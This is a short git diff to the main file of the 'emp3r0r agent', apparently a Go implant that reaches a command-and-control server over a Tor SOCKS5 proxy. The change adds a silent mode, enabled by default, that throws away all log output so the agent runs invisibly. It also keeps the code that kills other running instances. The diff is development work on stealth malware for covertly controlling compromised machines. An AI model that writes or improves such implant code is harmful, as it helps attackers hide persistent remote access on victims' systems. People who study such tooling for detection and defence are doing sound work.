@@ -3,6 +3,7 @@ package main
 import (
 	"flag"
 	"fmt"
+	"io/ioutil"
 	"log"
 	"os"
 	"strings"
@@ -13,8 +14,16 @@ import (
 )
 
 func main() {
-	fmt.Println("emp3r0r agent started")
-	log.SetOutput(os.Stderr)
+	c2proxy := flag.String("proxy", "socks5://127.0.0.1:9050", "Proxy for emp3r0r agent's C2 communication")
+	silent := flag.Bool("silent", true, "Show logs or not")
+	flag.Parse()
+
+	// silent switch
+	log.SetOutput(ioutil.Discard)
+	if !*silent {
+		fmt.Println("emp3r0r agent has started")
+		log.SetOutput(os.Stderr)
+	}
 
 	// kill any running agents
 	alive, procs := agent.IsProcAlive("emp3r0r")
@@ -50,9 +59,6 @@ func main() {
 	} else {
 		agent.CCAddress += "/"
 	}
-
-	c2proxy := flag.String("proxy", "socks5://127.0.0.1:9050", "Proxy for emp3r0r agent's C2 communication")
-	flag.Parse()
 
 	// if CC is behind tor, a proxy is needed
 	agent.HTTPClient = tun.EmpHTTPClient("")
